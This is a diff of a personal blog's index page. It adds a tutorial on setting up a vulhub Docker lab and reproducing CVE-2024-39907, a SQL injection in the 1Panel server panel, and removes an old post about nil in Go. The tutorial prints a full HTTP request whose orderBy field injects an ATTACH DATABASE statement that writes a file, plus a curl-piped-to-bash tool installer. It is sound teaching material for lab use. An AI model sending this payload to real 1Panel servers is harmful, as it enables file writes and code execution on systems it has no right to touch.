@@ -158,6 +158,187 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2025/12/04/CVE-2024-39907/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/12/04/CVE-2024-39907/" class="post-title-link" itemprop="url">From scratch, a hands-on, step-by-step guide to setting up Docker and reproducing the CVE-2024-39907 vulnerability.</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2025-12-04 22:03:51" itemprop="dateCreated datePublished" datetime="2025-12-04T22:03:51-05:00">2025-12-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2025-12-05 21:22:44" itemprop="dateModified" datetime="2025-12-05T21:22:44-05:00">2025-12-05</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Vulnerable-research/" itemprop="url" rel="index"><span itemprop="name">Vulnerable research</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Vulnerable-research/linux/" itemprop="url" rel="index"><span itemprop="name">linux</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h1><p> For beginners, improving penetration testing skills while keeping up with the rapid development of security technologies is a challenge faced by everyone in the industry. Learning how to build your own vulnerable lab environment from scratch using Docker is essential. In this article, using CVE-2024-39907 as an example, we provide a step-by-step guide to help newcomers build their own vulnerability reproduction environment.</p>
+<h2 id="Vulnerability-Overview"><a href="#Vulnerability-Overview" class="headerlink" title="Vulnerability Overview"></a>Vulnerability Overview</h2><p> 1Panel is a web-based Linux server management control panel that provides a graphical interface for server administration. CVE-2024-39907 refers to a collection of SQL injection vulnerabilities found in multiple interfaces of the 1Panel control panel. Due to insufficient filtering at several injection points, attackers could achieve arbitrary file write, ultimately leading to remote code execution (RCE).The vulnerability affects 1Panel version v1.10.9-lts and earlier, and has been patched in version v1.10.12-lts.</p>
+<h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><p>​    <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2024/CVE-2024-39907.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/main/http/cves/2024/CVE-2024-39907.yaml</a><br>​    <a target="_blank" rel="noopener" href="https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-5grx-v727-qmq6">https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-5grx-v727-qmq6</a><br>​    <a target="_blank" rel="noopener" href="https://hub.docker.com/r/moelin/1panel">https://hub.docker.com/r/moelin/1panel</a></p>
+<h1 id="Environment-Information"><a href="#Environment-Information" class="headerlink" title="Environment Information"></a>Environment Information</h1><table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Version</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Operating System</td>
+<td>Kali Linux</td>
+</tr>
+<tr>
+<td>Docker</td>
+<td>version 24.0.2</td>
+</tr>
+<tr>
+<td>Docker Compose</td>
+<td>Version v2.18.1</td>
+</tr>
+<tr>
+<td>Yakit</td>
+<td>1.4.4-beta15</td>
+</tr>
+</tbody></table>
+<h2 id="Preliminary-Preparation-Installing-Docker"><a href="#Preliminary-Preparation-Installing-Docker" class="headerlink" title="Preliminary Preparation (Installing Docker)"></a>Preliminary Preparation (Installing Docker)</h2><h3 id="Install-Docker"><a href="#Install-Docker" class="headerlink" title="Install Docker"></a>Install Docker</h3><p>​     First, switch to the root user and check whether Docker is already installed on the system. If you see a message like the one below, it means Docker is not installed:</p>
+<p><img src="/images/docker01.png"></p>
+<p>Next, install Docker. Save the following code as docker_install.sh and run it.</p>
+<p><img src="/images/docker02.png"><br>  After the installation completed, you will see a message like the one below , indicating that the Docker has been successful installed.</p>
+<p><img src="/images/docker03.png"></p>
+<h3 id="Setting-up-a-Docker-testing-environment"><a href="#Setting-up-a-Docker-testing-environment" class="headerlink" title="Setting up a Docker testing environment"></a>Setting up a Docker testing environment</h3><p>To build your own vulnerability testing environment with Docker, you first need to obtain the YAML file used by docker compose. In this case , we are using the Docker environments provided by th open-source platform vulhub.org in China.You can download them using the following command:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/vulhub/vulhub.git</span><br></pre></td></tr></table></figure>
+<p>After the download is completed, switch to &#x2F;vulhub&#x2F;1panel&#x2F;CVE-2024-39907 with root privileges , and run the following command:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker compose up -d</span><br></pre></td></tr></table></figure>
+
+<p>You will see a similar prompt window. Please wait patiently until process complete.</p>
+<p><img src="/images/docker04.png"></p>
+<p>At this point,the Docker envrionment container have been downloaded locally. You can now use the command to view the currently running containers.</p>
+<p><img src="/images/docker05.png"></p>
+<p>The output is shown below.</p>
+<p><img src="/images/docker06.png"></p>
+<p>At this point, we need remember the value in the NAMES column,as it will be used when we operate this Docker container .In addition, remember that the port is 10086. I recommend openning another terminal with root privileges to monitor the container’s log output in real<br>time,which will help us track its current running status.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs -f cve-2024-39907-1panel-1</span><br></pre></td></tr></table></figure>
+
+<p>At this point,we have started tracking the container logs.</p>
+<p><img src="/images/docker07.png"></p>
+<p>Next,we can use the following command to enter the Docker container environment to inspect specific files ,because sometimes you may need create databases ,tables and other related information:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it cve-2024-39907-1panel-1 bash</span><br></pre></td></tr></table></figure>
+
+<p>At this point,note the change in the command prompt :</p>
+<p><img src="/images/docker08.png"></p>
+<p>It has changed from “root@ubuntu1804:&#x2F;home&#x2F;ubuntu&#x2F;Desktop&#x2F;vulhub&#x2F;1panel&#x2F;CVE-2024-39907#” into “root@4847e2dc4245:&#x2F;#”.Now ,open the firefox browser and enter the following in the address bar:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:10086/entrance</span><br></pre></td></tr></table></figure>
+
+<p>At this point, the page should be open:</p>
+<p><img src="/images/docker09.png"></p>
+<p>Where we can find the username and password? Don’t worry,in the YAML directory, there is a file named readme.md, which provided information about these items:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">port:10086</span><br><span class="line">username：1panel</span><br><span class="line">password：1panel_password</span><br><span class="line">related path ：entrance</span><br></pre></td></tr></table></figure>
+
+<p>Enter the username and password, check the agreement option, you will be able to acess the following interface:</p>
+<p><img src="/images/docker10.png"></p>
+<p>At this point,the Docker container for the vulnerability has been successful set up.Next comes the exciting part-conducting the penetration test.In addition,a few more notes:sometimes you need to copy files form Docker container to the host machine , such as set up a database,how can this be done? Docker provides the cp command,which allows files copying between the container and the host machine, and it also works the other way around.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">cp</span> &lt;CONTAINER NAMES&gt;:/var/www/html/install/discuz.sql /home/ubuntu/Desktop/</span><br></pre></td></tr></table></figure>
+
+<p>This command copies a file from the container to the host machine,and it also works the other way arround. One thing to remember: this command must be executed in host machine’s command line.Can we start penetration test now? Not yet - We still need to install Yakit or BurpSuite.</p>
+<h2 id="Install-Yakit"><a href="#Install-Yakit" class="headerlink" title="Install Yakit"></a>Install Yakit</h2><p>Considering that the BurpSuite version on Kali is quite outdated,and Yakit tends to be more convenient to use , you can dicide for yourself whether you want to install Yakit.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -sS -L http://oss-qn.yaklang.com/install-latest-yak.sh)</span><br></pre></td></tr></table></figure>
+
+<p>After the installation is completed, you will see information similar to the following:</p>
+<p><img src="/images/Yakit01.png"></p>
+<p>This indicated that Yakit has installed . Run the yak command  to check the version and confirm that the installation was successful.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yak version</span><br></pre></td></tr></table></figure>
+
+<p>If the screen looks like the image below, it means Yakit has been successful installed.</p>
+<p><img src="/images/Yakit02.png"></p>
+<p>Next,grant executable permissions to Yakit-1.4.5-1128-linux-amd64.AppImage:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x Yakit-1.4.5-1128-linux-amd64.AppImage</span><br></pre></td></tr></table></figure>
+
+<p>At this point,switch to the kali user,and you can run Yakit:</p>
+<p><img src="/images/Yakit03.png"></p>
+<h3 id="Configure-Yakit’s-proxy"><a href="#Configure-Yakit’s-proxy" class="headerlink" title="Configure Yakit’s proxy"></a>Configure Yakit’s proxy</h3><p>The default proxy settings in Yakit are : ip : 127.0.0.1 port:8083.I have installed foxyproxy in firefox,and configured it as shown below:</p>
+<p><img src="/images/Yakit04.png"></p>
+<p>At this point , when you open firefox, select Yakit in FoxyProxy, as shown in the red box below :</p>
+<p><img src="/images/Yakit05.png"></p>
+<p>Open localhost:10086&#x2F;entrance, enter the username and password, and you will be able to access the interface shown above.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username：1panel</span><br><span class="line">password：1panel_password</span><br></pre></td></tr></table></figure>
+<p>In Yakit,we should have already captured the data packages,and now it is time for the exciting part - verifying the vulnerability.<br>First , in the packets captured by Yakit,select any packet(the packet must contain a cookie) shown in the figure below:</p>
+<p><img src="/images/Yakit06.png"></p>
+<p>Then, open the link related to 1Panel in Vulbox:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub/blob/master/1panel/CVE-2024-39907/README.zh-cn.md</span><br></pre></td></tr></table></figure>
+
+<p>The packet for reproducing the vulnerability is as follows:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/hosts/command/search HTTP/1.1</span><br><span class="line">Host: your-ip:10086</span><br><span class="line">Accept-Language: zh</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</span><br><span class="line">Cookie: psession=your-session-cookie</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 83</span><br><span class="line"> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;page&quot;</span>:1,</span><br><span class="line">  <span class="string">&quot;pageSize&quot;</span>:10,</span><br><span class="line">  <span class="string">&quot;groupID&quot;</span>:0,</span><br><span class="line">  <span class="string">&quot;orderBy&quot;</span>:<span class="string">&quot;3;ATTACH DATABASE &#x27;/tmp/randstr.txt&#x27; AS test;create TABLE test.exp (data text);create TABLE test.exp (data text);drop table test.exp;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;order&quot;</span>:<span class="string">&quot;ascending&quot;</span>,</span><br><span class="line">  <span class="string">&quot;name&quot;</span>:<span class="string">&quot;a&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Modify the values of the host and Cookie fields：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /api/v1/hosts/command/search HTTP/1.1</span><br><span class="line">Host: localhost:10086</span><br><span class="line">Accept-Language: zh</span><br><span class="line">Accept: application/json, text/plain, */*</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</span><br><span class="line">Cookie: psession=6088e21d-0a44-4126-a561-1b7beaf4f314</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 83</span><br><span class="line"> </span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;page&quot;</span>:1,</span><br><span class="line">  <span class="string">&quot;pageSize&quot;</span>:10,</span><br><span class="line">  <span class="string">&quot;groupID&quot;</span>:0,</span><br><span class="line">  <span class="string">&quot;orderBy&quot;</span>:<span class="string">&quot;3;ATTACH DATABASE &#x27;/tmp/randstr.txt&#x27; AS test;create TABLE test.exp (data text);create TABLE test.exp (data text);drop table test.exp;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;order&quot;</span>:<span class="string">&quot;ascending&quot;</span>,</span><br><span class="line">  <span class="string">&quot;name&quot;</span>:<span class="string">&quot;a&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Select the packet content above and copy it. Then open the Web Fuzzer feature in Yakit and paste it into the Request section, as shown in the figure below:</p>
+<p><img src="/images/Yakit07.png"></p>
+<p>Click ‘Send Request’. In the response data on the right, you will see a message indicating ‘SQL logic error xxx’, as shown in the figure below:</p>
+<p><img src="/images/Yakit08.png"></p>
+<p>Now that you have verified in your own Docker environment that this vulnerability does in fact exist, isn’t that cool? I hope everyone enjoys their penetration testing. This concludes the article.</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2025/08/16/common-work-pool-in-golang/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1210,99 +1391,6 @@ The following code demonstrates how to execute the script:
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2019/01/03/goNil/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2019/01/03/goNil/" class="post-title-link" itemprop="url">nil in the Go language</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2019-01-03 22:59:12" itemprop="dateCreated datePublished" datetime="2019-01-03T22:59:12-05:00">2019-01-03</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-17 11:38:41" itemprop="dateModified" datetime="2023-10-17T11:38:41-04:00">2023-10-17</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Go/" itemprop="url" rel="index"><span itemprop="name">Go</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Go/nil/" itemprop="url" rel="index"><span itemprop="name">nil</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>In the Go language, “<strong><em>nil</em></strong>“ is a special predefined value commonly used to represent zero values or missing values in certain data structures. Here are some common usages and scenarios for “<strong><em>nil</em></strong>“:</p>
-<ol>
-<li><strong><em>Pointer and Reference Types</em></strong>: The most common use of “<strong><em>nil</em></strong>“ is in pointer and reference types, indicating that a pointer doesn’t point to any valid memory address or a reference doesn’t reference any object. For example, “<strong><em>nil</em></strong>“ is used in the following cases:</li>
-</ol>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ptr *<span class="type">int</span>    <span class="comment">// Declare an integer pointer, its zero value is nil</span></span><br><span class="line"><span class="keyword">var</span> slice []<span class="type">int</span> <span class="comment">// Declare an integer slice, its zero value is nil</span></span><br><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span> <span class="comment">// Declare a map, its zero value is nil</span></span><br></pre></td></tr></table></figure>
-
-<ol start="2">
-<li><strong><em>Interface Types</em></strong>: “<strong><em>nil</em></strong>“ can also be used with interface types, signifying that an interface has no specific implemented value. This can be useful in some cases to check if an interface is empty (uninitialized or unassigned).</li>
-</ol>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myInterface <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> myInterface == <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;The interface is empty&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ol start="3">
-<li><strong><em>Function and Method Return Values</em></strong>: Functions and methods can return multiple values, some of which might be pointer types. In certain situations, returned pointers may be “<strong><em>nil</em></strong>,” indicating that there are no valid return values.</li>
-</ol>
-<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">findValue</span><span class="params">(slice []<span class="type">int</span>, target <span class="type">int</span>)</span></span> (*<span class="type">int</span>, <span class="type">bool</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> i, val := <span class="keyword">range</span> slice &#123;</span><br><span class="line">        <span class="keyword">if</span> val == target &#123;</span><br><span class="line">            <span class="keyword">return</span> &amp;slice[i], <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>It’s important to handle “<strong><em>nil</em></strong>“ with care to avoid runtime errors like null pointer references. It’s a good practice to check whether pointers, slices, maps, and other data structures are “<strong><em>nil</em></strong>“ before accessing them to ensure safety.</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1374,19 +1462,19 @@ The following code demonstrates how to execute the script:
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">47</span>
+          <span class="site-state-item-count">48</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">66</span>
+        <span class="site-state-item-count">68</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">23</span>
+        <span class="site-state-item-count">26</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
